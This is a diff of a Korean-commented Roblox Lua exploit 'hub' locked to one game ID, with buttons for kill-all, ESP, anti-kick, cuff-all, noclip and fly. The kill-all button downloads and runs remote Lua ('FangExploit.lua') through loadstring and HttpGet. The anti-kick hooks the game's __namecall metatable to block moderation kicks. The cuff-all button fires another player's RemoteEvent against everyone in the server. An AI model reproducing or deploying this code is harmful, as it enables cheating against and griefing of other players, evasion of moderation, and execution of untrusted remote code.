@@ -1,73 +1,319 @@
--- 로컬 플레이어 가져오기
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+local allowedGameId = 15271273323  -- 특정 게임의 ID (여기에 원하는 게임 ID를 입력)
+local currentGameId = game.PlaceId
 
--- 기존 UI 제거 (중복 생성 방지)
-if PlayerGui:FindFirstChild("CustomHub") then
-    PlayerGui:FindFirstChild("CustomHub"):Destroy()
-end
+-- 허브 UI를 해당 게임 ID에 맞게 설정
+if currentGameId == allowedGameId then
+    -- 기존 코드 (허브 UI와 기능들)
+    local Players = game:GetService("Players")
+    local Player = Players.LocalPlayer
+    local PlayerGui = Player:WaitForChild("PlayerGui")
+    local UserInputService = game:GetService("UserInputService")
 
--- 새로운 ScreenGui 생성
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "CustomHub"
-ScreenGui.Parent = PlayerGui
+    -- 기존 UI 제거 (중복 생성 방지)
+    if PlayerGui:FindFirstChild("CustomHub") then
+        PlayerGui:FindFirstChild("CustomHub"):Destroy()
+    end
 
--- 허브 UI 프레임 생성
-local Hub = Instance.new("Frame")
-Hub.Size = UDim2.new(0.25, 0, 0.4, 0) -- 허브 크기
-Hub.Position = UDim2.new(0.375, 0, 0.3, 0) -- 중앙 정렬
-Hub.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- 어두운 색상
-Hub.BackgroundTransparency = 0.2 -- 반투명 효과
-Hub.Active = true
-Hub.Draggable = true
-Hub.Parent = ScreenGui
+    -- 새로운 ScreenGui 생성
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "CustomHub"
+    ScreenGui.Parent = PlayerGui
 
--- 허브 UI 둥근 모서리 추가
-local UICorner = Instance.new("UICorner", Hub)
-UICorner.CornerRadius = UDim.new(0.1, 0)
+    -- 허브 UI 프레임 생성
+    local Hub = Instance.new("Frame")
+    Hub.Size = UDim2.new(0.25, 0, 0.4, 0)
+    Hub.Position = UDim2.new(0.375, 0, 0.3, 0)
+    Hub.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Hub.BackgroundTransparency = 0.2
+    Hub.Active = true
+    Hub.Draggable = true
+    Hub.Parent = ScreenGui
 
--- "Made by console X" 라벨 생성
-local Label = Instance.new("TextLabel", Hub)
-Label.Size = UDim2.new(1, 0, 0.1, 0)
-Label.Position = UDim2.new(0, 0, 0, 0)
-Label.Text = "Made by console X"
-Label.TextColor3 = Color3.new(1, 1, 1)
-Label.BackgroundTransparency = 1
-Label.Font = Enum.Font.SourceSansBold
-Label.TextScaled = true
+    -- 허브 UI 둥근 모서리 추가
+    local UICorner = Instance.new("UICorner", Hub)
+    UICorner.CornerRadius = UDim.new(0.1, 0)
 
--- 버튼 생성 함수
-local function createButton(parent, text, size, position)
-    local Button = Instance.new("TextButton")
-    Button.Size = size
-    Button.Position = position
-    Button.Text = text
-    Button.TextColor3 = Color3.new(0, 0, 0)
-    Button.BackgroundColor3 = Color3.fromRGB(255, 50, 50) -- 버튼 색상 (빨강)
-    Button.BorderSizePixel = 0
-    Button.Font = Enum.Font.SourceSansBold
-    Button.TextScaled = true
-    Button.Parent = parent
+    -- 버튼 생성 함수
+    local function createButton(parent, text, size, position, callback)
+        local Button = Instance.new("TextButton")
+        Button.Size = size
+        Button.Position = position
+        Button.Text = text
+        Button.TextColor3 = Color3.new(0, 0, 0)
+        Button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+        Button.BorderSizePixel = 0
+        Button.Font = Enum.Font.SourceSansBold
+        Button.TextScaled = true
+        Button.Parent = parent
 
-    -- 버튼 둥근 모서리 추가
-    local BtnCorner = Instance.new("UICorner", Button)
-    BtnCorner.CornerRadius = UDim.new(0.2, 0)
+        -- 버튼 둥근 모서리 추가
+        local BtnCorner = Instance.new("UICorner", Button)
+        BtnCorner.CornerRadius = UDim.new(0.2, 0)
 
-    -- 버튼 테두리 추가
-    local Stroke = Instance.new("UIStroke", Button)
-    Stroke.Thickness = 2
-    Stroke.Color = Color3.fromRGB(200, 0, 0) -- 어두운 빨강
+        -- 버튼 클릭 시 콜백 함수 실행
+        Button.MouseButton1Click:Connect(callback)
 
--- 버튼 배치 설정
-local buttonSize = UDim2.new(0.25, 0, 0.2, 0) -- 버튼 크기
-local positions = {
-    {0.125, 0.15}, {0.625, 0.15}, -- 첫 번째 줄 (2개)
-    {0.125, 0.4}, {0.625, 0.4}, -- 두 번째 줄 (2개)
-    {0.125, 0.65}, {0.625, 0.65} -- 세 번째 줄 (2개)
-}
+        return Button
+    end
 
--- 버튼 생성
-for i = 1, 6 do
-    createButton(Hub, "Button " .. i, buttonSize, UDim2.new(positions[i][1], 0, positions[i][2], 0))
+    -- 킬올 기능
+    local function killAllPlayers()
+        getgenv().exclude_me = false
+        getgenv().kill = true
+        getgenv().fire = false
+        local func = ({pcall(loadstring, game.HttpGet(game, "https://raw.githubusercontent.com/xsinew/scripts/refs/heads/main/FangExploit.lua"))})[2]
+        pcall(func, func)
+    end
+
+    -- ESP 기능 (무지개 색상으로 빛나게 하는 기능)
+    local function enableESP()
+        -- 새로운 플레이어나 캐릭터가 추가될 때마다 ESP 업데이트
+        local function createESPForPlayer(player)
+            local rainbowColor = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            if player.Character and player.Character:FindFirstChild("Head") then
+                local head = player.Character.Head
+                local espPart = Instance.new("Part")
+                espPart.Size = Vector3.new(1, 1, 1)
+                espPart.Position = head.Position
+                espPart.Anchored = true
+                espPart.CanCollide = false
+                espPart.Transparency = 0.5
+                espPart.BrickColor = BrickColor.new(rainbowColor)
+                espPart.Parent = game.Workspace
+                espPart.Name = "ESP"
+
+                -- ESP 파트가 캐릭터와 함께 움직이도록 업데이트
+                game:GetService("RunService").Heartbeat:Connect(function()
+                    if player.Character and player.Character:FindFirstChild("Head") then
+                        espPart.Position = player.Character.Head.Position
+                    else
+                        espPart:Destroy() -- 캐릭터가 사라지면 ESP 파트도 제거
+                    end
+                end)
+            end
+        end
+
+        -- 모든 플레이어에 대해 ESP 적용
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= Player then
+                createESPForPlayer(player)
+            end
+        end
+
+        -- 새로운 플레이어나 캐릭터가 들어오면 ESP 추가
+        Players.PlayerAdded:Connect(function(player)
+            player.CharacterAdded:Connect(function(character)
+                createESPForPlayer(player)
+            end)
+        end)
+
+        -- 죽은 플레이어가 다시 들어오면 ESP 적용
+        Players.PlayerRemoving:Connect(function(player)
+            if player.Character then
+                local espPart = player.Character:FindFirstChild("ESP")
+                if espPart then
+                    espPart:Destroy() -- 플레이어가 떠나면 ESP 제거
+                end
+            end
+        end)
+    end
+
+    -- 안티 킥 기능
+    local function antiKick()
+        local mt = getrawmetatable(game)
+        setreadonly(mt, false)
+        local oldmt = mt.__namecall
+        mt.__namecall = newcclosure(function(Self, ...)
+            local method = getnamecallmethod()
+            if method == 'Kick' then
+                print("Tried To kick")
+                wait(9e9)
+                return nil
+            end
+            return oldmt(Self, ...)
+        end)
+        setreadonly(mt, true)
+    end
+
+    -- 수갑 채우기 기능
+    local function cuffAllPlayers()
+        local function findPlayerWithCuffs()
+            for _, player in ipairs(Players:GetPlayers()) do
+                local backpack = player:FindFirstChild("Backpack")
+                if backpack and backpack:FindFirstChild("수갑") then
+                    return player
+                end
+            end
+            return nil
+        end
+
+        local playerWithCuffs = findPlayerWithCuffs()
+        if not playerWithCuffs then
+            warn("No player with handcuffs found.")
+            return
+        end
+
+        local backpack = playerWithCuffs:FindFirstChild("Backpack")
+        local cuffs = backpack and backpack:FindFirstChild("수갑")
+
+        if not cuffs or not cuffs:FindFirstChild("RemoteEvent") then
+            warn("Player with cuffs does not have the RemoteEvent.")
+            return
+        end
+
+        local remoteEvent = cuffs.RemoteEvent
+
+        for _, targetPlayer in ipairs(Players:GetPlayers()) do
+            if targetPlayer ~= playerWithCuffs and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
+                local success, err = pcall(function()
+                    remoteEvent:FireServer("Cuff", targetPlayer.Character.Head)
+                end)
+                if not success then
+                    warn("Error cuffing player:", targetPlayer.Name, err)
+                end
+                task.wait(0.2)
+            end
+        end
+    end
+
+    -- 노클립 기능
+    local noclip = false
+    local function NoclipLoop()
+        if noclip and Player.Character then
+            for _, child in pairs(Player.Character:GetDescendants()) do
+                if child:IsA("BasePart") and child.CanCollide then
+                    child.CanCollide = false
+                end
+            end
+        end
+    end
+
+    local function setNoclip(value)
+        noclip = value
+        if noclip then
+            while noclip do
+                NoclipLoop()
+                task.wait(0.1)
+            end
+        else
+            for _, child in pairs(Player.Character:GetDescendants()) do
+                if child:IsA("BasePart") then
+                    child.CanCollide = true
+                end
+            end
+        end
+    end
+
+    -- 플라이 기능
+    local isFlying = false
+    local flySpeed = 50
+    local function startFlying()
+        if isFlying then return end
+        isFlying = true
+
+        local character = Player.Character
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+        -- 비행 시작 시 PlatformStand 설정
+        humanoid.PlatformStand = true
+
+        -- CFrame으로 비행을 조작하는 방법
+        local bodyVelocity = Instance.new("BodyVelocity")
+        bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
+        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+        bodyVelocity.Parent = character:WaitForChild("HumanoidRootPart")
+
+        -- 비행 시의 이동을 처리
+        local function fly()
+            local camera = workspace.CurrentCamera
+            local moveDirection = Vector3.new(0, 0, 0)
+
+            -- 키 입력을 처리하여 이동 방향 계산
+            UserInputService.InputBegan:Connect(function(input, processed)
+                if not processed then
+                    if input.KeyCode == Enum.KeyCode.W then
+                        moveDirection = camera.CFrame.LookVector
+                    elseif input.KeyCode == Enum.KeyCode.S then
+                        moveDirection = -camera.CFrame.LookVector
+                    elseif input.KeyCode == Enum.KeyCode.A then
+                        moveDirection = -camera.CFrame.RightVector
+                    elseif input.KeyCode == Enum.KeyCode.D then
+                        moveDirection = camera.CFrame.RightVector
+                    end
+                end
+            end)
+
+            -- 계속해서 비행
+            while isFlying do
+                bodyVelocity.Velocity = moveDirection * flySpeed
+                wait(0.1)
+            end
+        end
+
+        fly()
+    end
+
+    local function stopFlying()
+        if not isFlying then return end
+        isFlying = false
+
+        local humanoid = Player.Character:FindFirstChildOfClass("Humanoid")
+        humanoid.PlatformStand = false
+
+        -- 비행을 멈추고 BodyVelocity 제거
+        local bodyVelocity = Player.Character:FindFirstChild("HumanoidRootPart"):FindFirstChildOfClass("BodyVelocity")
+        if bodyVelocity then
+            bodyVelocity:Destroy()
+        end
+    end
+
+    -- 버튼 배치 설정
+    local buttonSize = UDim2.new(0.25, 0, 0.2, 0)
+    local positions = {
+        {0.125, 0.1}, {0.625, 0.1}, 
+        {0.125, 0.3}, {0.625, 0.3}, 
+        {0.125, 0.5}, {0.625, 0.5}
+    }
+
+    local buttons = {
+        {text = "킬올", callback = killAllPlayers},
+        {text = "ESP", callback = enableESP},
+        {text = "안티킥 설정", callback = antiKick},
+        {text = "수갑 올", callback = cuffAllPlayers},
+        {text = "노클립", callback = function() setNoclip(not noclip) end},
+        {text = "플라이", callback = function() 
+            if isFlying then
+                stopFlying()
+            else
+                startFlying()
+            end
+        end}
+    }
+
+    -- 버튼들 생성
+    for i, buttonInfo in ipairs(buttons) do
+        createButton(Hub, buttonInfo.text, buttonSize, UDim2.new(positions[i][1], 0, positions[i][2], 0), buttonInfo.callback)
+    end
+
+    -- 개발자 텍스트 추가 (허브 안에 위치하도록)
+    local devText = Instance.new("TextLabel")
+    devText.Text = "Made by saram04413"
+    devText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    devText.TextSize = 14
+    devText.Position = UDim2.new(0.5, 0, 0.85, 0)  -- 허브 하단에 배치
+    devText.AnchorPoint = Vector2.new(0.5, 0)
+    devText.BackgroundTransparency = 1
+    devText.Font = Enum.Font.SourceSans
+    devText.Parent = Hub
+
+    -- Discord 초대 링크 텍스트 추가 (작은 글씨로)
+    local discordText = Instance.new("TextLabel")
+    discordText.Text = "스크립트 -> https://discord.gg/KFqPnmGBTZ"
+    discordText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discordText.TextSize = 10
+    discordText.Position = UDim2.new(0.5, 0, 0.92, 0)  -- 허브 하단에 추가
+    discordText.AnchorPoint = Vector2.new(0.5, 0)
+    discordText.BackgroundTransparency = 1
+    discordText.Font = Enum.Font.SourceSans
+    discordText.Parent = Hub
 end
